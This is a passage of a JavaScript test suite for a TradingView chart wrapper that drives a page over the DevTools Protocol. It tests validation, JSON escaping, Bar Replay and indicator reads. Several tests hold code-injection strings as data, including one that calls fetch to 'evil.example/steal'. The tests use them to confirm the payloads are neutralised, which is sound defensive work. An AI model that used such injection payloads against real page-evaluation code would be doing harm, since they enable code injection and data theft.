import test from "node:test";
import assert from "node:assert/strict";
import { createHash, webcrypto } from "node:crypto";
import vm from "node:vm";
import { TradingView } from "../../build/tradingview.js";
import { summarizeMovingAverages, SMA_TEN_STUDY_ID } from "../../build/movingAverageContext.js";

/** Fake CdpClient that records expressions instead of talking to a page. */
function fakeCdp(result = {}) {
  const calls = [];
  return {
    calls,
    evaluate(expression) {
      calls.push(expression);
      return Promise.resolve(result);
    },
  };
}

test("moving-average snapshot reads only bounded public metadata and plot-ID keyed values", async () => {
  const cdp=fakeCdp(), tv=new TradingView(cdp);
  assert.throws(()=>tv.getMovingAverageStudies(1001,0),/count/);
  assert.throws(()=>tv.getMovingAverageStudies(20,-1),/chartIndex/);
  assert.throws(()=>tv.getMovingAverageStudies(20,undefined),/chartIndex/);
  await tv.getMovingAverageStudies(3,1);
  const script=cdp.calls[0], inputs=[{id:"in_0",value:20},{id:"text",value:"PRIVATE SOURCE"},{id:"pineId",value:"PRIVATE ID"}];
  const source={id:()=>"s1",metaInfo:()=>({id:"Script$PUB;kWRFasqqymAq56dUJNmDbMqN55wBFWPa@tv-scripting",plots:[{id:"plot_0",type:"line"}],styles:{plot_0:{title:"SMA #1"}}}),
    properties:()=>({childs:()=>({styles:{childs:()=>({plot_0:{state:()=>({visible:true,display:15,private:"PRIVATE STYLE"})}})}})}),offset:()=>0,
    data:()=>({_items:[{value:[1577836800,100]},{value:[1577840400,NaN]}]})};
  const chart={symbol:()=>"OANDA:EURUSD",resolution:()=>"60",getAllStudies:()=>[{id:"s1",name:"Simple Moving Averages"}],chartModel:()=>({dataSources:()=>[source]}),
    getStudyById:()=>({getInputValues:()=>inputs,getInputsInfo:()=>[{id:"in_0",name:"SMA #1",type:"integer"}],isVisible:()=>true,hasError:()=>false})};
  const run=()=>JSON.parse(JSON.stringify(vm.runInNewContext(script,{window:{TradingViewApi:{chart:i=>{assert.equal(i,1);return chart;}}}})));
  const result=run();
  assert.equal(result.chartIndex,1); assert.equal(result.symbol,"OANDA:EURUSD");
  assert.deepEqual(result.studies[0].inputs,[{id:"in_0",name:"SMA #1",type:"integer",value:20}]);
  assert.deepEqual(result.studies[0].bars[0].values,{plot_0:100});
  assert.equal(result.studies[0].bars[1].values.plot_0,null);
  assert.equal(JSON.stringify(result).includes("PRIVATE"),false);
  inputs.push({id:"future_internal_source",value:"PRIVATE NEW INTERNAL VALUE"});
  const unknownInput=run();
  assert.equal(JSON.stringify(unknownInput).includes("PRIVATE"),false,"unknown input values must not cross CDP");
  assert.match(unknownInput.studies[0].error,/unavailable/);
  inputs.pop();
  const saved=source.metaInfo; source.metaInfo=()=>({...saved(),id:"different@tv-scripting"});
  assert.equal(run().studies.length,0); assert.equal(run().unmappedStudies.length,1);
  chart.getAllStudies=()=>Array.from({length:65},(_,i)=>({id:`s${i}`,name:"x"}));
  assert.throws(run,/too many studies/);
});

test("all twenty interleaved SMA/colorer columns flow through snapshot extraction into ten correct summaries", async()=>{
  const native=Array.from({length:13},(_,i)=>({time:1577836800+i*3600,timeIso:new Date((1577836800+i*3600)*1000).toISOString(),
    open:100+i,high:101+i,low:99+i,close:100+i,volume:null}));
  const inputs=Array.from({length:10},(_,i)=>[{id:`in_${2*i}`,name:`SMA #${i+1}`,type:"integer",value:i+1},
    {id:`in_${2*i+1}`,name:`SMA Source #${i+1}`,type:"source",value:"close"}]).flat().reverse();
  const plots=Array.from({length:20},(_,i)=>({id:`plot_${i}`,type:i%2?"colorer":"line"}));
  const meta={id:SMA_TEN_STUDY_ID,plots,styles:Object.fromEntries(plots.map((p,i)=>[p.id,{title:i%2?p.id:`SMA #${i/2+1}`}]))};
  const source={id:()=>"ten",metaInfo:()=>meta,offset:()=>0,properties:()=>({childs:()=>({styles:{childs:()=>Object.fromEntries(plots.map(p=>[p.id,{state:()=>({visible:true,display:15})}]))}})}),
    data:()=>({_items:native.map((b,i)=>({value:[b.time,...plots.map((p,j)=>j%2?999999:i<j/2?null:100+i-j/4)]}))})};
  const chart={symbol:()=>"OANDA:EURUSD",resolution:()=>"60",getAllStudies:()=>[{id:"ten",name:"Simple Moving Averages"}],chartModel:()=>({dataSources:()=>[source]}),
    getStudyById:()=>({getInputValues:()=>inputs,getInputsInfo:()=>inputs,isVisible:()=>true,hasError:()=>false})};
  const tv=new TradingView({evaluate:async expression=>JSON.parse(JSON.stringify(vm.runInNewContext(expression,{window:{TradingViewApi:{chart:()=>chart}}})))});
  const snapshot=await tv.getMovingAverageStudies(13,0);
  const r=summarizeMovingAverages({symbol:chart.symbol(),resolution:"60",count:13,bars:native},snapshot,chart.symbol(),"60",new Date("2020-01-03T00:00:00Z"));
  assert.equal(r.status,"complete");assert.equal(r.moving_averages.length,10);
  for(const [i,row] of r.moving_averages.entries()) {
    assert.equal(row.settings.period,i+1);assert.equal(row.plot_id,`plot_${2*i}`);
    assert.equal(row.value,111-i/2);assert.equal(row.previous_value,110-i/2);
    assert.equal(row.verification.status,"matched_native_ohlcv_sma");assert.equal(row.slope.price_change,1);
  }
  assert.equal(JSON.stringify(snapshot).includes("999999"),false,"colorers must never be emitted as value columns");
});

test("setSymbol embeds the symbol as a JSON string literal (no code injection)", async () => {
  const cdp = fakeCdp({ symbol: "X", resolution: "1D" });
  const tv = new TradingView(cdp);
  const hostile = `BTC"); fetch("https://evil.example/steal"); ("`;
  await tv.setSymbol(hostile);

  const expr = cdp.calls[0];
  // the hostile payload must appear only in its escaped JSON form
  assert.ok(expr.includes(JSON.stringify(hostile)), "payload should be JSON-escaped");
  assert.ok(!expr.includes(`("${hostile}"`), "raw payload must not be spliced into code");
  // sanity: the escaped form neutralizes the quote that would break out of the literal
  assert.ok(!expr.includes(`BTC");`));
});

test("setResolution rejects strings that are not resolution-shaped", async () => {
  const tv = new TradingView(fakeCdp());
  for (const bad of ["", "1); hack(", "abc", "1D'; drop", "60m2"]) {
    assert.throws(() => tv.setResolution(bad), /resolution must look like/, bad);
  }
});

test("setResolution accepts typical TradingView resolutions", async () => {
  const cdp = fakeCdp({ symbol: "X", resolution: "1D" });
  const tv = new TradingView(cdp);
  for (const ok of ["1", "5", "15", "60", "240", "1D", "1W", "1M", "D", "W"]) {
    await tv.setResolution(ok);
  }
  assert.equal(cdp.calls.length, 10);
});

test("setResolution targets an explicit chart index", async () => {
  const cdp = fakeCdp({ symbol: "X", resolution: "15" });
  const tv = new TradingView(cdp);
  await tv.setResolution("15", 1);
  assert.match(cdp.calls[0], /window\.TradingViewApi\.chart\(1\)/);
  assert.throws(() => tv.setResolution("15", -1), /chartIndex must be/);
  assert.throws(() => tv.setResolution("15", 1.5), /chartIndex must be/);
});

test("setSymbol rejects empty input", () => {
  const tv = new TradingView(fakeCdp());
  assert.throws(() => tv.setSymbol(""), /non-empty/);
  assert.throws(() => tv.setSymbol("   "), /non-empty/);
});

test("setSymbol targets an explicit chart index", async () => {
  const cdp = fakeCdp({ symbol: "OANDA:EURUSD", resolution: "60", changed: true, bars: 10 });
  const tv = new TradingView(cdp);
  await tv.setSymbol("OANDA:EURUSD", 2);
  assert.ok(cdp.calls[0].includes("window.TradingViewApi.chart(2)"));
});

test("setSymbol/setResolution never report a non-matching state as success", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  await tv.setSymbol("BTCUSD");
  await tv.setResolution("240");
  for (const expr of cdp.calls) {
    assert.ok(expr.includes("clearTimeout(timer)"), "callback must cancel the timeout");
    assert.ok(expr.includes("did not take effect"), "non-matching state must reject");
    assert.ok(expr.includes("changed:") || expr.includes("changed "), "result must carry a changed flag");
    // both the callback and the timeout path must go through the same check
    assert.ok(expr.includes("settle(true)") && expr.includes("settle(false)"),
      "callback and timeout must share the verifying settle path");
    assert.ok(expr.includes("callback fired but chart shows"),
      "a callback with a non-matching state must reject too");
  }
  // symbol matching must tolerate exchange prefixes the page adds
  assert.ok(cdp.calls[0].includes('a.endsWith(":" + r)'));
  // resolution matching must normalize D/1D, W/1W, M/1M
  assert.ok(cdp.calls[1].includes('/^[SDWM]$/.test(u) ? "1" + u : u'));
});

test("setSymbol/setResolution wait for a transient empty series, then reject if it remains empty", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  await tv.setSymbol("BTCUSD");
  await tv.setResolution("240");
  for (const expr of cdp.calls) {
    assert.ok(expr.includes("no data loaded (0 bars)"), "zero bars must reject");
    assert.ok(expr.includes("setTimeout(() => { retry = null; settle(viaCallback); }, 100)"), "zero bars must be retried before rejection");
    assert.ok(expr.indexOf("const deadline = Date.now() + 8000") < expr.indexOf("const settle = (viaCallback)"), "retry state must share the settle closure");
    assert.ok(expr.includes("bars"), "result must report the bar count");
  }
});

test("setSymbol/setResolution roll the chart back before rejecting", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  await tv.setSymbol("BTCUSD");
  await tv.setResolution("240");
  const [symExpr, resExpr] = cdp.calls;
  for (const expr of [symExpr, resExpr]) {
    assert.ok(expr.includes("the chart was restored to"), "rollback success must be reported");
    assert.ok(expr.includes("WARNING: the chart could not be restored"), "rollback failure must warn");
    assert.ok(
      expr.match(/fail\(/g).length >= 2,
      "both failure branches must go through the rollback path",
    );
  }
  assert.ok(symExpr.includes("chart.setSymbol(before, finish)"), "symbol rollback uses the previous symbol");
  assert.ok(resExpr.includes("chart.setResolution(before, finish)"), "resolution rollback uses the previous timeframe");
});

test("Bar Replay status is read-only and normalizes watched values", async () => {
  const cdp = fakeCdp({ available: true, started: false });
  const result = await new TradingView(cdp).getReplayStatus();
  assert.equal(result.available, true);
  const expr = cdp.calls[0];
  assert.match(expr, /replay\.currentDate\(\)/);
  assert.match(expr, /typeof value\.value === "function"/);
  assert.doesNotMatch(expr, /replay\.(?:buy|sell|closePosition)\(/);
});

test("startReplay validates and context-binds the requested historical instant", async () => {
  const tv = new TradingView(fakeCdp());
  assert.throws(
    () => tv.startReplay({ startAt: "not-a-date", expectedSymbol: "OANDA:EURUSD", expectedResolution: "60" }),
    /valid ISO-8601/,
  );
  assert.throws(
    () => tv.startReplay({ startAt: "2999-01-01T00:00:00.000Z", expectedSymbol: "OANDA:EURUSD", expectedResolution: "60" }),
    /must be in the past/,
  );
  assert.throws(
    () => tv.startReplay({ startAt: "2025-01-01T00:00:00.000Z", expectedSymbol: "", expectedResolution: "60" }),
    /expectedSymbol/,
  );

  const cdp = fakeCdp({ requestedStartAt: "2025-01-01T00:00:00.000Z", status: {} });
  const hostile = `OANDA:EURUSD"); fetch("https://evil.example/steal"); ("`;
  await new TradingView(cdp).startReplay({
    startAt: "2025-01-01T00:00:00.000Z",
    expectedSymbol: hostile,
    expectedResolution: "60",
  });
  const expr = cdp.calls[0];
  assert.ok(expr.includes(JSON.stringify(hostile)));
  assert.ok(!expr.includes(`const expectedSymbol = "${hostile}"`));
  assert.doesNotMatch(expr, /replay\.(?:buy|sell|closePosition)\(/);
  assert.match(expr, /active chart symbol does not match expectedSymbol/);
  assert.match(expr, /replay\.selectDate\(1735689600000\)/);
  assert.match(expr, /Bar Replay did not start within 20 seconds/);
  assert.match(expr, /await replay\.stopReplay\(\)/);
  assert.match(expr, /and cleanup also failed/);
});

test("startReplay cleans up a partially opened toolbar when date selection fails", async () => {
  let expr = "";
  const cdp = { evaluate: async (value) => { expr = value; return {}; } };
  await new TradingView(cdp).startReplay({
    startAt: "2025-01-01T00:00:00.000Z",
    expectedSymbol: "OANDA:EURUSD",
    expectedResolution: "60",
  });
  const state = { toolbar: false, started: false };
  let stopCalls = 0;
  const watched = (read) => ({ value: read });
  const replay = {
    currentDate: () => watched(() => null),
    getReplaySelectedDate: () => watched(() => null),
    replayResolutions: () => watched(() => []),
    currentReplayResolution: () => watched(() => null),
    autoReplayResolution: () => watched(() => "60"),
    isReplayAvailable: () => watched(() => true),
    isReplayToolbarVisible: () => watched(() => state.toolbar),
    isReplayStarted: () => watched(() => state.started),
    isReadyToPlay: () => watched(() => false),
    isAutoplayStarted: () => watched(() => false),
    isJumpToBarModeEnabled: () => watched(() => false),
    autoplayDelay: () => 1000,
    selectDate: async () => {
      state.toolbar = true;
      throw new Error("select failed");
    },
    stopReplay: async () => {
      stopCalls += 1;
      state.toolbar = false;
      state.started = false;
    },
  };
  const context = {
    window: {
      TradingViewApi: {
        replayApi: async () => replay,
        activeChart: () => ({ symbol: () => "OANDA:EURUSD", resolution: () => "60" }),
        activeChartIndex: () => 0,
      },
    },
    Date,
    setTimeout,
  };
  await assert.rejects(vm.runInNewContext(expr, context), /select failed/);
  assert.equal(stopCalls, 1);
  assert.equal(state.toolbar, false);
});

test("startReplay waits for the selected date and cursor to agree on the requested pane", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  const requested = Date.parse("2025-01-01T00:00:00.000Z");
  await tv.startReplay({ startAt: new Date(requested).toISOString(),
    expectedSymbol: "OANDA:EURUSD", expectedResolution: "5", chartIndex: 1 });
  const chart = { symbol: () => "OANDA:EURUSD", resolution: () => "5" };
  let index = 1;
  let selected = null;
  let cursor = Date.parse("2025-08-01T00:00:00.000Z");
  let stopCalls = 0;
  let waits = 0;
  const replay = {
    currentDate: () => cursor, getReplaySelectedDate: () => selected, replayResolutions: () => ["5"],
    currentReplayResolution: () => "5", autoReplayResolution: () => "5", autoplayDelay: () => 1000,
    isReplayAvailable: () => true, isReplayToolbarVisible: () => selected !== null,
    isReplayStarted: () => selected !== null, isReadyToPlay: () => selected !== null,
    isJumpToBarModeEnabled: () => false, isAutoplayStarted: () => false,
    selectDate: async (time) => { selected = time; },
    stopReplay: async () => { stopCalls++; },
  };
  const context = { Date, window: { TradingViewApi: {
    activeChart: () => chart, activeChartIndex: () => index, replayApi: async () => replay,
  } }, setTimeout: (fn) => { waits++; cursor = requested; queueMicrotask(fn); } };
  const result = await vm.runInNewContext(cdp.calls[0], context);
  assert.equal(waits, 1);
  assert.equal(result.status.currentTime, requested);
  assert.equal(stopCalls, 0);
  index = 0;
  selected = null;
  await assert.rejects(vm.runInNewContext(cdp.calls[0], context), /active chart index/);
  assert.equal(selected, null);
});

test("stepReplay is bounded, paused-only, and verifies time advancement", async () => {
  const tv = new TradingView(fakeCdp());
  for (const bad of [0, 101, 1.5]) assert.throws(() => tv.stepReplay(bad), /steps must be/);
  const cdp = fakeCdp({ requestedSteps: 3, completedSteps: 3, reachedEnd: false });
  await new TradingView(cdp).stepReplay(3);
  const expr = cdp.calls[0];
  assert.match(expr, /pause Bar Replay autoplay before stepping/);
  assert.match(expr, /await replay\.doStep\(\)/);
  assert.match(expr, /current\.currentTime !== prior/);
  assert.doesNotMatch(expr, /replay\.(?:buy|sell|closePosition|toggleAutoplay)\(/);
});

test("stopReplay closes the toolbar and verifies real-time mode", async () => {
  const cdp = fakeCdp({ changed: true, before: {}, after: {} });
  await new TradingView(cdp).stopReplay();
  const expr = cdp.calls[0];
  assert.match(expr, /await replay\.stopReplay\(\)/);
  assert.match(expr, /Bar Replay did not stop within 10 seconds/);
  assert.doesNotMatch(expr, /replay\.(?:buy|sell|closePosition)\(/);
});

test("getOhlcv bars carry timeIso and a forming flag heuristic", async () => {
  const cdp = fakeCdp({ symbol: "X", resolution: "1D", count: 0, bars: [] });
  const tv = new TradingView(cdp);
  await tv.getOhlcv(5);
  const expr = cdp.calls[0];
  assert.ok(expr.includes("toISOString()"), "bars must include ISO time");
  assert.ok(expr.includes("bar.forming = true"), "last forming bar must be flagged");
  // minutes, seconds, day, week, month resolutions must all be handled
  assert.ok(expr.includes("{ S: 1, D: 86400, W: 604800, M: 2592000 }"));
});

test("getIndicatorValues bars carry timeIso", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getIndicatorValues({ count: 3 });
  assert.ok(cdp.calls[0].includes("toISOString()"));
});

test("getChartContext exposes study ids alongside names", async () => {
  const cdp = fakeCdp({ charts: [] });
  const tv = new TradingView(cdp);
  await tv.getChartContext();
  assert.ok(
    cdp.calls[0].includes("({ id: s.id, name: s.name })"),
    "studies must include the id used by get_indicator_* tools",
  );
});

test("getOhlcv validates count and chartIndex before touching the page", () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getOhlcv(NaN), /count must be/);
  assert.throws(() => tv.getOhlcv(0), /count must be/);
  assert.throws(() => tv.getOhlcv(-5), /count must be/);
  assert.throws(() => tv.getOhlcv(Infinity), /count must be/);
  assert.throws(() => tv.getOhlcv(10, 1.5), /chartIndex must be/);
  assert.throws(() => tv.getOhlcv(10, -1), /chartIndex must be/);
  assert.throws(() => tv.getOhlcv(10, "1); hack("), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");
});

test("getOhlcv floors fractional counts and targets the right chart", async () => {
  const cdp = fakeCdp({ symbol: "X", resolution: "1D", count: 0, bars: [] });
  const tv = new TradingView(cdp);
  await tv.getOhlcv(10.9, 1);
  const expr = cdp.calls[0];
  assert.ok(expr.includes("slice(-10)"), "fractional count should floor");
  assert.ok(expr.includes("api.chart(1)"), "should target chart 1");

  await tv.getOhlcv(5);
  assert.ok(cdp.calls[1].includes("api.activeChart()"), "default is active chart");
});

test("getIndicatorValues validates studyId, count and chartIndex before touching the page", () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  for (const badId of ['"); hack(); ("', "a b", "x".repeat(65), "évil", ""]) {
    assert.throws(() => tv.getIndicatorValues({ studyId: badId }), /studyId must match/, badId);
  }
  assert.throws(() => tv.getIndicatorValues({ count: 0 }), /count must be/);
  assert.throws(() => tv.getIndicatorValues({ count: NaN }), /count must be/);
  assert.throws(() => tv.getIndicatorValues({ chartIndex: -1 }), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");
});

test("getIndicatorValues normalizes and embeds the plot filter, or disables it entirely", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getIndicatorValues({ studyId: "mlahPw", count: 2000, plotTitles: ["  Total OI ", "OPEN_INTEREST"] });
  const expr = cdp.calls[0];
  // Titles are matched case-insensitively on the trimmed value, so the filter is normalized once
  // here rather than repeatedly inside the page.
  assert.ok(expr.includes('const plotFilter = ["total oi","open_interest"]'),
    "normalized filter should be embedded as a JSON literal");
  assert.ok(expr.includes("out.plots = selected.map"), "only selected plots may be described");
  assert.ok(expr.includes("for (const k of selected)"), "only selected plots may be read into values");

  await tv.getIndicatorValues({ studyId: "mlahPw", count: 5 });
  assert.ok(cdp.calls[1].includes("const plotFilter = null"),
    "an absent filter must not narrow anything");
});

test("getIndicatorValues rejects an empty plot filter before touching the page", () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getIndicatorValues({ plotTitles: [] }), /at least one plot/);
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");
});

test("getIndicatorValues embeds studyId as a JSON literal and honors options", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getIndicatorValues({ studyId: "mlahPw", count: 5.9, chartIndex: 1, includeAllPlots: true });
  const expr = cdp.calls[0];
  assert.ok(expr.includes('"mlahPw"'), "studyId should be quoted");
  assert.ok(expr.includes("const maxBars = 5"), "fractional count should floor");
  assert.ok(expr.includes("api.chart(1)"), "should target chart 1");
  assert.ok(expr.includes("const includeAllPlots = true"));

  await tv.getIndicatorValues();
  const expr2 = cdp.calls[1];
  assert.ok(expr2.includes("const studyIdFilter = null"), "default is all studies");
  assert.ok(expr2.includes("api.activeChart()"), "default is active chart");
  assert.ok(expr2.includes("const includeAllPlots = false"));
});

test("getIndicatorValues excludes plotcandle's ohlc_* mirror plots by default", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getIndicatorValues();
  const expr = cdp.calls[0];
  assert.ok(expr.includes("/^ohlc_/"), "ohlc_* plot types must be treated as noise");
  assert.ok(
    expr.includes('type === "alertcondition"') && expr.includes('type === "textcolor"'),
    "existing noise types must still be excluded",
  );
});

test("getIndicatorInputs validates ids and always excludes Pine-internal inputs", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getIndicatorInputs({ studyId: '1"; steal()' }), /studyId must match/);
  assert.equal(cdp.calls.length, 0);

  await tv.getIndicatorInputs({ studyId: "XfUjdm" });
  const expr = cdp.calls[0];
  for (const hidden of ["text", "pineId", "pineVersion", "pineFeatures"]) {
    assert.ok(expr.includes(`"${hidden}"`), `HIDDEN set must contain ${hidden}`);
  }
  assert.ok(expr.includes("truncated"), "long string values must be truncated");
});

test("setIndicatorInput validates before touching the page", () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  assert.throws(() => tv.setIndicatorInput('"); hack(', [{ id: "in_0", value: 1 }]), /studyId must match/);
  assert.throws(() => tv.setIndicatorInput("st1", []), /non-empty array/);
  assert.throws(() => tv.setIndicatorInput("st1", Array(21).fill({ id: "in_0", value: 1 })), /at most 20/);
  assert.throws(() => tv.setIndicatorInput("st1", [{ id: '"); hack(', value: 1 }]), /invalid input id/);
  assert.throws(() => tv.setIndicatorInput("st1", [{ id: "pineId", value: "x" }]), /internal.*cannot be set/);
  assert.throws(() => tv.setIndicatorInput("st1", [{ id: "text", value: "x" }]), /internal.*cannot be set/);
  assert.throws(
    () => tv.setIndicatorInput("st1", [{ id: "in_0", value: { nested: true } }]),
    /must be a number, string or boolean/,
  );
  assert.throws(() => tv.setIndicatorInput("st1", [{ id: "in_0", value: 1 }], { chartIndex: -1 }), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");
});

test("setIndicatorInput writes via the generic study API and verifies the id exists first", async () => {
  const cdp = fakeCdp({ studyId: "st1", applied: [{ id: "in_0", name: "Length", value: 14 }] });
  const tv = new TradingView(cdp);
  await tv.setIndicatorInput("st1", [{ id: "in_0", value: 14 }], { chartIndex: 1 });
  const expr = cdp.calls[0];
  assert.ok(expr.includes('"st1"'), "studyId quoted as JSON");
  assert.ok(expr.includes("api.chart(1)"), "should target chart 1");
  assert.ok(expr.includes("studyApi.setInputValues(inputs)"), "must use the generic study setter");
  assert.ok(expr.includes("has no input with id"), "unknown ids must be rejected on the page too");
  assert.ok(!/save|delete|method:\s*["']POST/.test(expr), "must never write to pine-facade");

  await tv.setIndicatorInput("st1", [{ id: "in_0", value: 14 }]);
  assert.ok(cdp.calls[1].includes("api.activeChart()"), "default is active chart");
});

/**
 * Execute the setIndicatorInput page expression under a virtual clock so the
 * settle loop's timing can be tested without real waits. `reportAt` is a list
 * of [virtualMs, reportId] describing when activeStrategyReportData swaps its
 * identity; `loadingUntil` keeps studyApi.isLoading() true before that time.
 * Returns the expression result plus the virtual time at which it read the
 * inputs back (i.e. when the settle loop declared the recalculation finished).
 */
async function runSettleLoop(inputs, { reportAt = [], loadingUntil = 0 } = {}) {
  let expr;
  const cdp = { evaluate: (e) => ((expr = e), Promise.resolve({})) };
  await new TradingView(cdp).setIndicatorInput("st1", inputs);

  let now = 0;
  let settledAt = null;
  let inputReads = 0;
  const studyApi = {
    getInputValues() {
      inputReads += 1;
      if (inputReads > 1) settledAt = now; // second read happens after the settle loop
      return inputs.map((inp) => ({ id: inp.id, value: inp.value }));
    },
    setInputValues() {},
    getInputsInfo: () => [],
    isLoading: () => now < loadingUntil,
  };
  const bt = {
    activeStrategyReportData: {
      value() {
        let report = "r0";
        for (const [t, id] of reportAt) if (now >= t) report = id;
        return report;
      },
    },
  };
  const context = vm.createContext({
    window: {
      TradingViewApi: {
        activeChart: () => ({ getStudyById: () => studyApi }),
        backtestingStrategyApi: async () => bt,
      },
    },
    Date: { now: () => now },
    setTimeout: (fn, ms) => {
      now += ms;
      queueMicrotask(fn);
    },
  });
  const result = await vm.runInContext(expr, context);
  return { settledAt, result };
}

test("setIndicatorInput multi-input settle outlasts a lagging second recalculation", async () => {
  // Regression for the race observed 2026-07-10: two inputs changed in one
  // call, the first recalc swapped the report at 500ms, the final one only at
  // 1800ms. The old 1000ms quiet window settled at ~1750ms and handed back
  // the intermediate (stale) strategy report.
  const { settledAt, result } = await runSettleLoop(
    [{ id: "in_0", value: 20 }, { id: "in_1", value: 20 }],
    { reportAt: [[500, "r1"], [1800, "r2"]] },
  );
  assert.ok(settledAt >= 1800, `must settle after the final recalc, settled at ${settledAt}ms`);
  assert.equal(result.settled, true, "a clean settle must be reported as settled");
  assert.equal(result.warning, undefined, "a clean settle must carry no warning");
});

test("setIndicatorInput never settles while the study still reports loading", async () => {
  const { settledAt, result } = await runSettleLoop(
    [{ id: "in_0", value: 20 }, { id: "in_1", value: 20 }],
    { reportAt: [[500, "r1"]], loadingUntil: 3000 },
  );
  assert.ok(settledAt >= 3000, `must wait for isLoading to clear, settled at ${settledAt}ms`);
  assert.equal(result.settled, true);
});

test("setIndicatorInput single-input settle keeps the fast path", async () => {
  const { settledAt } = await runSettleLoop(
    [{ id: "in_0", value: 20 }],
    { reportAt: [[500, "r1"]] },
  );
  assert.ok(settledAt >= 1500, `must wait a quiet window after the recalc, settled at ${settledAt}ms`);
  assert.ok(settledAt <= 3000, `single input must not pay the multi-input wait, settled at ${settledAt}ms`);
});

test("setIndicatorInput plain-indicator no-signal timeout still terminates", async () => {
  const single = await runSettleLoop([{ id: "in_0", value: 20 }]);
  assert.ok(single.settledAt > 3000 && single.settledAt <= 4000,
    `single input no-signal exit, settled at ${single.settledAt}ms`);
  assert.equal(single.result.settled, true, "a quiet no-signal exit counts as settled");
  const multi = await runSettleLoop([{ id: "in_0", value: 20 }, { id: "in_1", value: 20 }]);
  assert.ok(multi.settledAt > 5000 && multi.settledAt <= 6000,
    `multi input no-signal exit, settled at ${multi.settledAt}ms`);
});

test("setIndicatorInput reports settled:false when still loading at the 20s deadline", async () => {
  const { settledAt, result } = await runSettleLoop(
    [{ id: "in_0", value: 20 }, { id: "in_1", value: 20 }],
    { reportAt: [[500, "r1"]], loadingUntil: 30000 },
  );
  assert.ok(settledAt >= 20000, `must hold until the deadline, settled at ${settledAt}ms`);
  assert.equal(result.settled, false, "a deadline exit must not be reported as settled");
  assert.match(result.warning, /still recalculating/, "must warn that dependent reads may be stale");
  assert.equal(result.applied.length, 2, "applied values are still returned");
});

test("getIndicatorGraphics validates inputs before touching the page", () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getIndicatorGraphics({ studyId: '"); hack(' }), /studyId must match/);
  assert.throws(() => tv.getIndicatorGraphics({ limitPerKind: 0 }), /limitPerKind must be/);
  assert.throws(() => tv.getIndicatorGraphics({ limitPerKind: 501 }), /limitPerKind must be/);
  assert.throws(() => tv.getIndicatorGraphics({ limitPerKind: 2.5 }), /limitPerKind must be/);
  assert.throws(() => tv.getIndicatorGraphics({ chartIndex: -1 }), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0);
});

test("getIndicatorGraphics reads both raw and materialized primitive stores", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getIndicatorGraphics({ studyId: "lSZ7z5", limitPerKind: 10 });
  const expr = cdp.calls[0];
  assert.ok(expr.includes('"lSZ7z5"'), "studyId quoted as JSON");
  for (const kind of ["dwglabels", "dwglines", "dwgboxes"]) {
    assert.ok(expr.includes(kind), `must read ${kind}`);
  }
  assert.ok(expr.includes("_primitivesDataById"), "raw store");
  assert.ok(expr.includes("_primitiveById"), "materialized store");
  assert.ok(expr.includes("const limit = 10"));
});

test("getIndicatorTables validates inputs before touching the page", () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getIndicatorTables({ studyId: '"); hack(' }), /studyId must match/);
  assert.throws(() => tv.getIndicatorTables({ studyId: "a b" }), /studyId must match/);
  assert.throws(() => tv.getIndicatorTables({ chartIndex: -1 }), /chartIndex must be/);
  assert.throws(() => tv.getIndicatorTables({ chartIndex: 1.5 }), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");
});

test("getIndicatorTables reads both table stores and reconstructs grids safely", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getIndicatorTables({ studyId: "mlahPw", chartIndex: 1 });
  const expr = cdp.calls[0];
  assert.ok(expr.includes('"mlahPw"'), "studyId quoted as JSON");
  assert.ok(expr.includes("api.chart(1)"), "should target chart 1");
  for (const kind of ["dwgtables", "dwgtablecells"]) {
    assert.ok(expr.includes(kind), `must read ${kind}`);
  }
  // dwgtablecells stores are NOT nested like the other kinds — both shapes
  // must be handled, and both raw and materialized stores read
  assert.ok(expr.includes("isStore(inner)"), "outer values may be stores themselves");
  assert.ok(expr.includes("_primitivesDataById"), "raw store");
  assert.ok(expr.includes("_primitiveById"), "materialized store");
  assert.ok(expr.includes("truncated"), "cell text must be truncated");
  assert.ok(expr.includes("MAX_GRID_CELLS"), "grid size must be capped");
  assert.ok(expr.includes("grid[c.row][c.column] = c.text"), "grid keyed by row/column");

  await tv.getIndicatorTables();
  assert.ok(cdp.calls[1].includes("const studyIdFilter = null"), "default is all studies");
  assert.ok(cdp.calls[1].includes("api.activeChart()"), "default is active chart");
});

test("loadMoreHistory validates count and retries a transient unavailable pagination state", async () => {
  const cdp = fakeCdp({ requested: 1, barsBefore: 0, barsAfter: 0, added: 0, earliestTime: null, moreAvailable: null });
  const tv = new TradingView(cdp);
  assert.throws(() => tv.loadMoreHistory({ count: 0 }), /count must be/);
  assert.throws(() => tv.loadMoreHistory({ count: 5001 }), /count must be/);
  assert.throws(() => tv.loadMoreHistory({ count: 1.5 }), /count must be/);
  assert.equal(cdp.calls.length, 0);

  await tv.loadMoreHistory({ count: 250, chartIndex: 1 });
  const expr = cdp.calls[0];
  assert.ok(expr.includes("requestMoreData(requested)"));
  assert.ok(expr.includes("const requested = 250"));
